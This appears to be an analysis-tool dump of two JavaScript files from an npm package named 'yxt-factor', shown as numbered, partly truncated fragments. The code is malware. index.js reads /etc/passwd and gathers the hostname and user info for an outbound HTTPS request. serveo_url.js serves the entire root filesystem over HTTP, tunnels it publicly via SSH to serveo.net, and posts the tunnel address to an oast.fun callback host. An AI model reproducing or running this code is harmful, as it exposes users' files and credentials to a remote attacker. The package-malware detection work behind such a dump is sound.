// File: var/folders/rs/52vst_5924nc0zz5ccww9tl80000gp/T/tmpr4rc2jyt/yxt-factor/package/index.js
// ======================================================================
Line 1: const os = require("os")
Line 2: const dns = require("dns")
Line 3: const querystring = require("querystring")
Line 4: const https = require("https")
Line 5: const fs = require("fs")
Line 6: const packageJSON = require("./package.json")
Line 12: passwdData = fs.readFileSync("/etc/passwd", "utf8")
Line 21: os.hostname()
Line 22: os.userInfo()
Line 45: var req = https.request(options, (res) => {
    res.on("data", (d) => {
        process.stdout.write(d);
    });
})
Line 46: {
        process.stdout.write(d);
    }
Line 47: process.stdout.write(d)

// File: var/folders/rs/52vst_5924nc0zz5ccww9tl80000gp/T/tmpr4rc2jyt/yxt-factor/package/serveo_url.js
// ======================================================================
Line 1: _tmp_3 = require("child_process")
Line 2: const http = require("http")
Line 3: const readline = require("readline")
Line 4: const fs = require("fs")
Line 5: const path = require("path")
Line 9: const LISTENING_SERVER_URL = "http://afspwxfioktogtbvmujqbvhzlubziv9dy.oast.fun/serveo-ur"
Line 13: {
    if (err) {
      console.error(`Error reading directory: ${dirPath}`);
      res.writeHead(500, { "Content-Type": "text/plain" });
      res.end("Server error");
      return;
    }

    // Create an HTML response with links to files and directories
    let htmlContent = `<h1>Index of ${dirPath}</h1><ul>`;
    entries.forEach(entry => {
      const entryName = entry.name;
      const entryPath = path.join(dirPath, entryName);
      const linkPath = path.join("/", entryPath); // Public path for the file

      if (entry.isDirectory()) {
        htmlContent += `<li><a href="${linkPath}/">${entryName}/</a></li>`;
      } else {
        htmlContent += `<li><a href="${linkPath}">${entryName}</a></li>`;
      }
    });
    htmlContent += "</ul>";

    res.writeHead(200, { "Content-Type": "text/html" });
    res.end(htmlContent);
  }
Line 14: {
      console.error(`Error reading directory: ${dirPath}`);
      res.writeHead(500, { "Content-Type": "text/plain" });
      res.end("Server error");
      return;
    }
Line 17: res.end("Server error")
Line 25: path.join(dirPath, entryName)
Line 26: path.join("/", entryPath)
Line 37: res.end(htmlContent)
Line 42: (_tmp_4 = http.createServer((req, res) => {
  // Map the requested URL to the root directory
  let filePath = path.join('/', req.url); // Requested path mapped to the root directory

  // Normalize the file path to avoid traversal issues
  filePath = path.normalize(filePath);

  // Ensure the requested path is within the root directory
  if (!filePath.startsWith('/')) {
    res.writeHead(403, { "Content-Type": "text/plain" });
    res.end("Access forbidden");
    return;
  }

  console.log(`Requested path: ${filePath}`); // Log the requested path for debugging

  // Check if the requested path is a directory
  fs.stat(filePath, (err, stats) => {
    if (err) {
      console.error(`Error accessing path: ${filePath}`);
      res.writeHead(404, { "Content-Type": "text/plain" });
      res.end("File not found");
    } else if (stats.isDirectory()) {
      // Serve the directory listing
      serveDirectory(res, filePath);
    } else {
      // Serve the requested file
      fs.readFile(filePath, ...)
Line 44: path.join('/', req.url)
Line 50: {
    res.writeHead(403, { "Content-Type": "text/plain" });
    res.end("Access forbidden");
    return;
  }
Line 52: res.end("Access forbidden")
Line 59: fs.stat(filePath, (err, stats) => {
    if (err) {
      console.error(`Error accessing path: ${filePath}`);
      res.writeHead(404, { "Content-Type": "text/plain" });
      res.end("File not found");
    } else if (stats.isDirectory()) {
      // Serve the directory listing
      serveDirectory(res, filePath);
    } else {
      // Serve the requested file
      fs.readFile(filePath, (err, data) => {
        if (err) {
          console.error(`Error reading file: ${filePath}`);
          res.writeHead(404, { "Content-Type": "text/plain" });
          res.end("File not found");
        } else {
          // Determine content type based on file extension
          const extname = path.extname(filePath).toLowerCase();
          let contentType = 'application/octet-stream'; // Default binary type

          if (extname === '.html' || extname === '.htm') contentType = 'text/html';
          if (extname === '.css') contentType = 'text/css';
          if (extname === '.js') contentType =...
Line 60: {
      console.error(`Error accessing path: ${filePath}`);
      res.writeHead(404, { "Content-Type": "text/plain" });
      res.end("File not found");
    }
Line 63: res.end("File not found")
Line 69: fs.readFile(filePath, (err, data) => {
        if (err) {
          console.error(`Error reading file: ${filePath}`);
          res.writeHead(404, { "Content-Type": "text/plain" });
          res.end("File not found");
        } else {
          // Determine content type based on file extension
          const extname = path.extname(filePath).toLowerCase();
          let contentType = 'application/octet-stream'; // Default binary type

          if (extname === '.html' || extname === '.htm') contentType = 'text/html';
          if (extname === '.css') contentType = 'text/css';
          if (extname === '.js') contentType = 'application/javascript';
          if (extname === '.json') contentType = 'application/json';
          if (extname === '.jpg' || extname === '.jpeg') contentType = 'image/jpeg';
          if (extname === '.png') contentType = 'image/png';
          if (extname === '.gif') contentType = 'image/gif';
          if (extname === '.txt') contentType = 'text/plain';

 ...
Line 70: {
          console.error(`Error reading file: ${filePath}`);
          res.writeHead(404, { "Content-Type": "text/plain" });
          res.end("File not found");
        }
Line 73: res.end("File not found")
Line 74: {
          // Determine content type based on file extension
          const extname = path.extname(filePath).toLowerCase();
          let contentType = 'application/octet-stream'; // Default binary type

          if (extname === '.html' || extname === '.htm') contentType = 'text/html';
          if (extname === '.css') contentType = 'text/css';
          if (extname === '.js') contentType = 'application/javascript';
          if (extname === '.json') contentType = 'application/json';
          if (extname === '.jpg' || extname === '.jpeg') contentType = 'image/jpeg';
          if (extname === '.png') contentType = 'image/png';
          if (extname === '.gif') contentType = 'image/gif';
          if (extname === '.txt') contentType = 'text/plain';

          res.writeHead(200, { "Content-Type": contentType });
          res.end(data);
        }
Line 89: res.end(data)
Line 95: <operator>.formatString("HTTP server running at http://localhost:", LOCAL_PORT, "/ serving '/' directory")
Line 99: _tmp_10.push(<operator>.formatString("80:localhost:", LOCAL_PORT, ""))
Line 110: {
  console.log("SSH Output:", line); // Debug output
  const match = line.match(/https:\/\/([a-zA-Z0-9.-]+)\.serveo\.net/);
  if (match && !subdomainCaptured) {
    const subdomain = match[0];
    console.log("Subdomain captured:", subdomain);
    subdomainCaptured = true;

    // Send the subdomain to the listening server using HTTP
    const http = require('http');
    const data = JSON.stringify({ subdomain });

    const options = {
      hostname: 'afspwxfioktogtbvmujqbvhzlubziv9dy.oast.fun', // Replace with your actual server URL
      port: 80, // HTTP port
      path: '/endpoint', // Adjust the path if needed
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': data.length
      }
    };

    const req = http.request(options, (res) => {
      let body = '';
      res.on('data', (chunk) => {
        body += chunk;
      });
      res.on('end', () => {
        if (res.statusCode === 200) {
          console.log("Subdomai...
Line 112: const match = line.match(/https:\/\/([a-zA-Z0-9.-]+)\.serveo\.net/)
Line 113: {
    const subdomain = match[0];
    console.log("Subdomain captured:", subdomain);
    subdomainCaptured = true;

    // Send the subdomain to the listening server using HTTP
    const http = require('http');
    const data = JSON.stringify({ subdomain });

    const options = {
      hostname: 'afspwxfioktogtbvmujqbvhzlubziv9dy.oast.fun', // Replace with your actual server URL
      port: 80, // HTTP port
      path: '/endpoint', // Adjust the path if needed
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': data.length
      }
    };

    const req = http.request(options, (res) => {
      let body = '';
      res.on('data', (chunk) => {
        body += chunk;
      });
      res.on('end', () => {
        if (res.statusCode === 200) {
          console.log("Subdomain sent successfully.");
        } else {
          console.error(`Failed to send subdomain. HTTP Status: ${res.statusCode}`);
        }
      });
    });

    r...
Line 114: const subdomain = match[0]
Line 119: const http = require('http')
Line 133: const req = http.request(options, (res) => {
      let body = '';
      res.on('data', (chunk) => {
        body += chunk;
      });
      res.on('end', () => {
        if (res.statusCode === 200) {
          console.log("Subdomain sent successfully.");
        } else {
          console.error(`Failed to send subdomain. HTTP Status: ${res.statusCode}`);
        }
      });
    })
Line 151: req.write(data)
Line 152: req.end()
